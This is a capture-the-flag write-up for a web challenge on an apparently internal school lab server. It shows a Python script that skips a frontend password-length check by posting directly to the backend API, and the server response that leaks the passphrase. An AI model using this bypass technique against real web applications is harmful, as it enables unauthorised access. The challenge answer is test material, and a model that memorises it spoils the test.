# Nuclear Winter

## Description
Fabian, an Information Security Management student, was attending a class of Secure Coding when he noticed a nuclear warfare program, sitting on his lecturer's desktop.

Curious, he fumbled with the application, but couldn't get pass the password protection.


Help Fabian unlock nuclear power!

## Solution
1. Seems like there is a character check on the password field. The password field only accepts 6 characters.
```html
<input class="form-control" placeholder="Input sequence code..." name="code" type="password" maxlength="6" value="">
```
2. The solution is just to simply hook the API call and jump over the frontend validation by directly calling the backend API.
3. The following script calls the API with a long password, which... doesn't work...?
```py
import requests
import sys

sys.path.append("../../") # danger danger, do not change!! (secrets will break)

from Secrets.csrf import CSRF_KEY, CSRF_VALUE
from Secrets.session import SESSION_KEY, SESSION_VALUE

# Disable SSL warnings (mimosa uses a self-signed certificate)
requests.packages.urllib3.disable_warnings()

# Constants
URL = "https://mimosadism.dmit.local/challenges/nuclear-winter"

headers = {
    CSRF_KEY: CSRF_VALUE,
}

cookies = {
    SESSION_KEY: SESSION_VALUE,
}

data = {
    "code": "aaaaaaaaaaaaaaaaaaaaaaaa"
}

try:
    print(f"[*] Sending request to {URL} with headers: {headers} and cookies: {cookies} and data: {data} ")
    response = requests.post(URL, headers=headers, cookies=cookies, data=data, verify=False)
    print(response.text)
except requests.RequestException as e:
    print(f"Request failed: {e}")
```

4. The response body includes a reply: {"reply":"Incorrect passphrase!@4l\n # code : m1m0s4"}

5. Resending the exploit body with the code "m1m0s4" unlocks the challenge.

